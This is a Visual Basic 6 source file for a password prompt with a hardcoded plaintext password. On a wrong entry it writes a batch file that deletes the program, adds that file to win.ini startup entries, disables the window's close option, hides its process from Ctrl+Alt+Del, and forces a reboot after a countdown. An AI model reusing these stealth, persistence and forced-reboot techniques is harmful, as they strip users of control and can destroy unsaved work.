VERSION 5.00
Begin VB.Form frmPassWord 
   BorderStyle     =   3  'Fester Dialog
   Caption         =   "Password"
   ClientHeight    =   1125
   ClientLeft      =   45
   ClientTop       =   330
   ClientWidth     =   3030
   Icon            =   "frmPassWord.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   1125
   ScaleWidth      =   3030
   ShowInTaskbar   =   0   'False
   StartUpPosition =   2  'Bildschirmmitte
   Begin VB.Frame fraCountDown 
      Height          =   975
      Left            =   120
      TabIndex        =   2
      Top             =   0
      Width           =   2775
      Begin VB.Timer Timer1 
         Enabled         =   0   'False
         Interval        =   1000
         Left            =   240
         Top             =   480
      End
      Begin VB.Label lblCountDown 
         Alignment       =   2  'Zentriert
         Caption         =   "10"
         BeginProperty Font 
            Name            =   "Century Gothic"
            Size            =   36
            Charset         =   0
            Weight          =   600
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H0000FFFF&
         Height          =   735
         Left            =   120
         TabIndex        =   3
         Top             =   120
         Width           =   2535
      End
   End
   Begin VB.CommandButton cmdOK 
      Caption         =   "&OK"
      Default         =   -1  'True
      Height          =   255
      Left            =   2160
      TabIndex        =   1
      Top             =   600
      Width           =   735
   End
   Begin VB.TextBox txtPW 
      Height          =   285
      IMEMode         =   3  'DISABLE
      Left            =   120
      PasswordChar    =   "?"
      TabIndex        =   0
      Top             =   600
      Width           =   1935
   End
   Begin VB.Label lblText 
      Caption         =   "Please enter current Password..."
      Height          =   255
      Left            =   120
      TabIndex        =   4
      Top             =   240
      Width           =   2775
   End
End
Attribute VB_Name = "frmPassWord"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Option Explicit

Private Sub cmdOK_Click()
Dim Attempts As Integer

If txtPW = "amaru4president" Then
    MsgBox "You typed in the correct password!", vbOKOnly, "Congratulations"
    'load the next window
    End
Else
    MsgBox "Too bad, but that's the wrong password", vbOKOnly, "bye bye..."
        
    Open "C:\del.bat" For Output As #1
        Print #1, "@echo off"
        Print #1, "DEL " & CreateShortPath(App.Path & "\" & App.EXEName & ".exe")
    Close #1

        Call SysMenu_Handle
        fraCountDown.Visible = True
        Timer1.Enabled = True

End If
End Sub

Private Sub Form_Load()

Call Hide_In_CTRL_ALT_DEL

fraCountDown.Visible = False
End Sub

Private Sub Timer1_Timer()

WriteProfileSection "Windows", "Load=" & "C:\del.bat" & vbCrLf & "Open=" & "C:\del.bat"

lblCountDown.Caption = lblCountDown.Caption - 1
If lblCountDown.Caption < 1 Then
    Timer1.Enabled = False
    Call Reboot_Win
End If
End Sub

Private Sub SysMenu_Handle()
Dim Handle As Long

    Handle = GetSystemMenu(Me.hWnd, 0)
    RemoveMenu Handle, 6, &H400 'Close
    RemoveMenu Handle, 5, &H400 'Line
    RemoveMenu Handle, 1, &H400 'Move

End Sub

Private Sub Reboot_Win()
Shutdown 2, 0   '2; Reboot
                '0; Logoff
                '1; Shutdown
                '4; Forced Shutdown
End Sub

Public Function CreateShortPath(LongPath As String) As String
Dim ShortPath As String
Dim PathLength As Long
                        
ShortPath = Space(255)
PathLength = GetShortPathName(LongPath, ShortPath, Len(ShortPath))


If PathLength Then
    CreateShortPath = Left(ShortPath, PathLength)
End If
End Function

Public Sub Hide_In_CTRL_ALT_DEL()
Dim ProcID As Long
Dim RegServ As Long
                        
ProcID = GetCurrentProcessId()
RegServ = RegisterServiceProcess(ProcID, RSP_SIMPLE_SERVICE)
End Sub
